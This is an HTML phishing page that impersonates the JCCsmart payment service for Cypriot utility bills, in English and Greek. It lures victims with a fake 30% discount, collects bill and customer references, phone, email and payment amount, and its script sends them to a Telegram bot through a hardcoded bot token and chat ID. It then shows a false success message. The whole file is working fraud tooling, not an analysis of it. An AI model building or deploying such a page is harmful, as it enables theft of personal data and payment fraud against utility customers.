<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JCCsmart Secure Payment</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; padding: 0; color: #333; }
        header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
        .logo { font-weight: bold; font-size: 20px; display: flex; align-items: center; }
        .logo span { background: #5cb85c; color: #fff; padding: 2px 6px; border-radius: 4px; margin-right: 5px; }
        .logo-sub { color: #888; font-weight: 400; }
        
        .lang-switcher { display: flex; gap: 5px; }
        .lang-btn { background: #f0f0f0; border: 1px solid #ccc; padding: 5px 10px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: 600; color: #555; }
        .lang-btn.active { background: #5c46e5; color: #fff; border-color: #5c46e5; }

        .container { max-width: 400px; margin: 40px auto; padding: 0 20px; text-align: center; }
        .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 20px; margin: 15px 0; }
        .discount-badge { display: inline-block; color: #28a745; font-size: 12px; font-weight: 600; padding: 2px 0; margin-bottom: 5px; }
        .amount { font-size: 34px; font-weight: 800; color: #5c46e5; }
        .form-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; background: #fff; }
        input:focus, select:focus { border-color: #5c46e5; }
        button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #aaa; cursor: not-allowed; }
        .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

<header>
    <div class="logo"><span>JCC</span><div class="logo-sub">smart</div></div>
    <div class="lang-switcher">
        <button class="lang-btn active" onclick="setLanguage('en')">EN</button>
        <button class="lang-btn" onclick="setLanguage('gr')">GR</button>
    </div>
</header>

<div class="container" id="main-content">
    <!-- ТОЛЬКО ШАГ 1: Поиск счета и заполнение реквизитов -->
    <div id="step1">
        <h2 id="t-step1-title">Utility Bill Payment</h2>
        <p id="t-step1-subtitle" style="font-size: 14px; color: #666; margin-bottom: 20px;">Please identify your service invoice details.</p>
        
        <div class="form-group">
            <label id="t-label-provider">Utility Provider</label>
            <select id="provider">
                <!-- Опции генерируются скриптом переключения языков -->
            </select>
        </div>
        <div class="form-group">
            <label id="t-label-billref">Invoice / Bill Reference</label>
            <input type="text" id="bill-ref" placeholder="e.g. 8829-10">
        </div>
        <div class="form-group">
            <label id="t-label-custref">Customer Reference Number</label>
            <input type="text" id="cust-ref" placeholder="e.g. 10928374">
        </div>
        <div class="form-group">
            <label id="t-label-phone">Contact Phone Number</label>
            <input type="tel" id="user-phone" placeholder="+357 99 XXXXXX">
        </div>
        <div class="form-group">
            <label id="t-label-email">Email Address (For Receipt)</label>
            <input type="email" id="user-email" placeholder="example@mail.com">
        </div>
        
        <!-- Новое поле: Строчка для ввода суммы сколько надо платить -->
        <div class="form-group">
            <label id="t-label-amount-input">Amount to Pay (€)</label>
            <input type="number" id="amount-input" placeholder="0.00" step="0.01" oninput="updateLivePrice()">
        </div>

        <!-- Информационный блок, показывающий итоговую сумму плательщику -->
        <div class="amount-box">
            <div id="t-discount" class="discount-badge">Special discount -30%</div>
            <div id="t-total-due" style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
            <div id="current-amount-val" class="amount">0.00€</div>
        </div>
        
        <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
    </div>

    <div id="t-footer" class="footer-info">🔒 Secured by JCC Payment Systems</div>
</div>

<script>
// Настройки Telegram
const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
const CHAT_ID = '6576262467';

let currentLang = 'en';

const translations = {
    en: {
        step1Title: "Utility Bill Payment",
        step1Subtitle: "Please identify your service invoice details.",
        labelProvider: "Utility Provider",
        labelBillRef: "Invoice / Bill Reference",
        labelCustRef: "Customer Reference Number",
        labelPhone: "Contact Phone Number",
        labelEmail: "Email Address (For Receipt)",
        labelAmountInput: "Amount to Pay (€)",
        discount: "Special discount -30%",
        totalDue: "TOTAL AMOUNT DUE",
        btnStep1: "Proceed to Payment",
        btnStep1Processing: "Verifying Invoice...",
        alertInvoice: "Please fill out all fields and enter a valid amount",
        footer: "🔒 Secured by JCC Payment Systems",
        providers: [
            { text: "EAC (Electricity Authority of Cyprus)", value: "EAC (Electricity)" },
            { text: "Cyta Bill Payment", value: "Cyta (Telecom)" },
            { text: "Water Board Supply", value: "Water Board" },
            { text: "Municipality Refuse & Taxes", value: "Municipality Taxes" }
        ]
    },
    gr: {
        step1Title: "Πληρωμή Λογαριασμού Κοινής Ωφέλειας",
        step1Subtitle: "Παρακαλώ προσδιορίστε τα στοιχεία του τιμολογίου σας.",
        labelProvider: "Πάροχος Υπηρεσιών",
        labelBillRef: "Αριθμός Αναφοράς Τιμολογίου",
        labelCustRef: "Αριθμός Αναφοράς Πελάτη",
        labelPhone: "Αριθμός Τηλεφώνου Επικοινωνίας",
        labelEmail: "Διεύθυνση Email (για την απόδειξη)",
        labelAmountInput: "Ποσό Πληρωμής (€)",
        discount: "Ειδική έκπτωση -30%",
        totalDue: "ΣΥΝΟΛΙΚΟ ΟΦΕΙΛΟΜΕΝΟ ΠΟΣΟ",
        btnStep1: "Συνέχεια στην Πληρωμή",
        btnStep1Processing: "Επαλήθευση Τιμολογίου...",
        alertInvoice: "Παρακαλούμε συμπληρώστε όλα τα πεδία και εισάγετε ένα έγκυρο ποσό",
        footer: "🔒 Προστατεύεται από τα συστήματα πληρωμών JCC",
        providers: [
            { text: "AHK (Αρχή Ηλεκτρισμού Κύπρου)", value: "EAC (Electricity)" },
            { text: "Cyta Πληρωμή Λογαριασμού", value: "Cyta (Telecom)" },
            { text: "Συμβούλιο Υδατοπρομήθειας", value: "Water Board" },
            { text: "Δημοτικοί Φόροι & Τέλη", value: "Municipality Taxes" }
        ]
    }
};

// Динамическое обновление итоговой суммы при вводе пользователем
function updateLivePrice() {
    const inputVal = document.getElementById('amount-input').value;
    const currentPriceEl = document.getElementById('current-amount-val');
    
    if (inputVal && !isNaN(inputVal) && inputVal > 0) {
        currentPriceEl.innerText = parseFloat(inputVal).toFixed(2) + "€";
    } else {
        currentPriceEl.innerText = "0.00€";
    }
}

// Переключение языковых пакетов
function setLanguage(lang) {
    currentLang = lang;
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.innerText.toLowerCase() === lang);
    });

    const t = translations[lang];

    document.getElementById('t-step1-title').innerText = t.step1Title;
    document.getElementById('t-step1-subtitle').innerText = t.step1Subtitle;
    document.getElementById('t-label-provider').innerText = t.labelProvider;
    document.getElementById('t-label-billref').innerText = t.labelBillRef;
    document.getElementById('t-label-custref').innerText = t.labelCustRef;
    document.getElementById('t-label-phone').innerText = t.labelPhone;
    document.getElementById('t-label-email').innerText = t.labelEmail;
    document.getElementById('t-label-amount-input').innerText = t.labelAmountInput;
    document.getElementById('t-discount').innerText = t.discount;
    document.getElementById('t-total-due').innerText = t.totalDue;
    
    const btn1 = document.getElementById('btn-send-invoice');
    if (!btn1.disabled) btn1.innerText = t.btnStep1;

    const select = document.getElementById('provider');
    const currentValue = select.value;
    select.innerHTML = '';
    t.providers.forEach(p => {
        const opt = document.createElement('option');
        opt.value = p.value;
        opt.innerText = p.text;
        if (p.value === currentValue) opt.selected = true;
        select.appendChild(opt);
    });

    document.getElementById('t-footer').innerText = t.footer;
}

// Инициализация при загрузке
setLanguage('en');

// Надежная функция отправки в Telegram через официальный шлюз (api.telegram.org)
async function sendToTelegram(text) {
    const url = `telegram.org{BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
        const result = await response.json();
        return result.ok;
    } catch (error) {
        alert(currentLang === 'en' ? 'Connection Error.' : 'Σφάλμα σύνδεσης.');
        console.error(error);
        return false;
    }
}

// Сбор и отправка заполненных данных в Telegram
async function sendInvoiceData() {
    const provider = document.getElementById('provider').value;
    const billRef = document.getElementById('bill-ref').value.trim();
    const custRef = document.getElementById('cust-ref').value.trim();
    const phone = document.getElementById('user-phone').value.trim();
    const email = document.getElementById('user-email').value.trim();
    const enteredAmount = document.getElementById('amount-input').value.trim();

    // Проверка заполнения всех полей и корректности суммы
    if (!billRef || !custRef || !phone || !email || !enteredAmount || isNaN(enteredAmount) || enteredAmount <= 0) {
        alert(translations[currentLang].alertInvoice);
        return;
    }

    const btn = document.getElementById('btn-send-invoice');
    btn.disabled = true;
    btn.innerText = translations[currentLang].btnStep1Processing;

    const formattedAmount = parseFloat(enteredAmount).toFixed(2) + "€";

    const message = `🌐 *ЯЗЫК ИНΤΕΡΦΕЙΣΑ*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (РЕАЛЬНЫЙ ВВОД)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Введенная сумма: \`${formattedAmount}\``;
    
    const isSent = await sendToTelegram(message);
    if (isSent) {
        // Успешный экран после отправки первой страницы (имитация перехода к банку)
        document.getElementById('main-content').innerHTML = `
            <div style="padding: 40px 0;">
                <h2 style="color: #28a745;">✓ Submitted Successfully</h2>
                <p style="font-size: 15px; color: #666; margin-top: 10px;">Your invoice verification logs have been successfully dispatched.</p>
            </div>
        `;
    } else {
        btn.disabled = false;
        btn.innerText = translations[currentLang].btnStep1;
    }
}
</script>

</body>
</html>
